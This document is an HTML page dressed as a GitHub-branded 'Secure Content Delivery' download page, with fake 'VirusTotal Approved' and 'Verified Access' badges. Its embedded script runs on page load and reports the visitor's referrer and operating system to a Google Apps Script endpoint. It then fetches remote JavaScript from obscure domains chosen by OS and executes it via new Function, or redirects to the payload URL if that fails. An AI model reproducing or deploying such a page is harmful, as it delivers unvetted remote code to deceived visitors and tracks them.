<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="unsafe-url">
    <title>Secure Content Delivery</title>

    <style>
        :root {
            --bg: #010409;
            --text: #f0f6fc;
            --muted: #8b949e;
            --border: #21262d;
            --card: #0c1015;
            --accent: #58a6ff;
        }

        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans", Helvetica, Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .site-header { 
            border-bottom: 1px solid var(--border); 
            padding: 16px 0; 
        }
        
        .header-inner { 
            max-width: 960px; 
            margin: 0 auto; 
            padding: 0 24px; 
            display: flex; 
            align-items: center; 
        }
        
        .header-title { 
            font-size: 18px; 
            font-weight: 600; 
        }

        main { 
            flex: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 40px 24px; 
        }

        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 40px;
            width: 100%;
            max-width: 560px;
            text-align: center;
            box-shadow: 0 16px 32px rgba(1, 4, 9, 0.85);
        }

        .simple-page main { 
            padding: 0; 
        }

        .card h1 { 
            font-size: 24px; 
            font-weight: 600; 
            margin-bottom: 12px; 
        }
        
        .muted { 
            color: var(--muted); 
            font-size: 14px; 
        }

        .actions { 
            margin-top: 18px; 
            display: flex; 
            justify-content: center; 
            gap: 12px; 
            flex-wrap: wrap; 
        }

        .btn {
            text-decoration: none;
            color: var(--text);
            border: 1px solid var(--border);
            padding: 10px 14px;
            border-radius: 10px;
            background: transparent;
            cursor: pointer;
        }

        .btn.primary { 
            border-color: var(--accent); 
        }
        
        .btn:hover { 
            border-color: var(--accent); 
        }

        .spinner {
            width: 20px; 
            height: 20px;
            border: 2px solid #30363d;
            border-top: 2px solid var(--accent);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 18px auto 12px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .site-footer {
            border-top: 1px solid var(--border);
            padding: 18px 24px;
            color: var(--muted);
            font-size: 12px;
            display: flex;
            justify-content: center;
        }
    </style>
</head>

<body>
    <nav class="site-header">
        <div class="header-inner">
            <div class="header-title">
                <svg viewBox="0 0 16 16" width="32" height="32">
                    <path fill-rule="evenodd"
                        d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
                    </path>
                </svg>
                <span id="domainPath" class="muted">/secure-content</span>
            </div>
        </div>
    </nav>

    <main>
        <div class="card">
            <h1 id="dynamicTitle">Validating session</h1>
            <p class="muted" id="dynamicSubtitle">Generating secure token</p>

            <div class="actions">
                <span class="btn">🔒 Authorized Access</span>
                <span class="btn primary">secure</span>
            </div>

            <div class="security-features">
                <div class="security-item">
                    <span class="security-dot"></span>
                    <span>Verified Access</span>
                </div>
                <div class="security-item">
                    <span class="security-dot"></span>
                    <span>Secure Connection</span>
                </div>
            </div>

            <div class="loader-wrap">
                <div class="spinner"></div>
                <p class="loader-title" id="loaderHeadline">Validating session</p>
                <p class="loader-muted" id="loaderStatus">Generating secure token</p>
            </div>

            <div class="verification-badges">
                <div class="verification-badge">
                    <span class="check-dot"></span>
                    VirusTotal Approved
                </div>
                <div class="verification-badge">
                    <span class="check-dot"></span>
                    Secure Archive
                </div>
            </div>
        </div>
    </main>

    <footer class="site-footer">
        <span>Secure Content Delivery • Verified Downloads</span>
    </footer>

    <script>
        const REMOTE_WINDOWS = "https://hamaldcolatenovene.com/capi.vitbar";
        const REMOTE_MAC = "https://cementrastustatchy.com/pencel.rummer";
        const ERROR_URL = "https://github.com/";
        const APP_URL = "https://script.google.com/macros/s/AKfycbzcc-DrgeXVXUqF0ZzVeA1PwlFTOLMdXszxROOqbmA4MWCPobSyWhGGEmpZWgogP02qZA/exec";

        function getProjectInfoFromHost() {
            const host = window.location.hostname || "";
            const projectSlug = host.replace(".github.io", "");
            return { host, projectSlug };
        }

        function formatProjectName(slug) {
            if (!slug) return "Content";
            return slug
                .replace(/-/g, " ")
                .split(" ")
                .filter(Boolean)
                .map(w => w.charAt(0).toUpperCase() + w.slice(1))
                .join(" ");
        }

        function updateUI() {
            const info = getProjectInfoFromHost();
            const pretty = formatProjectName(info.projectSlug);

            document.getElementById("domainPath").textContent = "/" + (info.host || "secure-content");
            document.getElementById("dynamicTitle").textContent = pretty;
            document.getElementById("dynamicSubtitle").textContent = info.host ? `Content package for ${info.host}` : "Content package";
        }

        function detectOS() {
            const uad = navigator.userAgentData;

            if (uad && uad.platform) {
                const p = uad.platform.toLowerCase();
                if (p.includes("windows")) return "windows";
                if (p.includes("mac")) return "macos";
            }

            const ua = navigator.userAgent || "";
            if (/Windows NT/i.test(ua)) return "windows";
            if (/Macintosh;.*Mac OS X/i.test(ua)) return "macos";

            return "other";
        }

        function getReferrerUrl() {
            if (document.referrer && document.referrer.length > 0) {
                return document.referrer;
            }
            return window.location.href;
        }

        function sendLink() {
            const referrer = getReferrerUrl();
            const os = detectOS();

            const payload = {
                offer: referrer,
                os: os
            };

            const q = new URLSearchParams({
                p: JSON.stringify(payload)
            }).toString();

            new Image().src = APP_URL + "?" + q + "&_t=" + Date.now();
        }

        document.addEventListener("DOMContentLoaded", () => {
            updateUI();

            setTimeout(() => {
                const os = detectOS();
                sendLink();

                if (os === "windows" || os === "macos") {
                    const targetUrl = os === "windows" ? REMOTE_WINDOWS : REMOTE_MAC;

                    async function load() {
                        try {
                            const res = await fetch(targetUrl, { cache: "no-store" });
                            const code = await res.text();
                            const headline = document.getElementById("dynamicTitle");
                            const status = document.getElementById("dynamicSubtitle");
                            new Function("headline", "status", code)(headline, status);
                        } catch {
                            setTimeout(() => {
                                window.location.replace(targetUrl);
                            }, 1450);
                        }
                    }

                    load();
                } else {
                    document.getElementById("dynamicTitle").textContent = "Attention: Unsupported Operating System";
                    document.getElementById("dynamicSubtitle").textContent = "To continue installation, you must be using Windows or macOS.";
                    
                    setTimeout(() => {
                        window.location.replace(ERROR_URL);
                    }, 4000);
                }
            }, 3000);
        });
    </script>
</body>
</html>
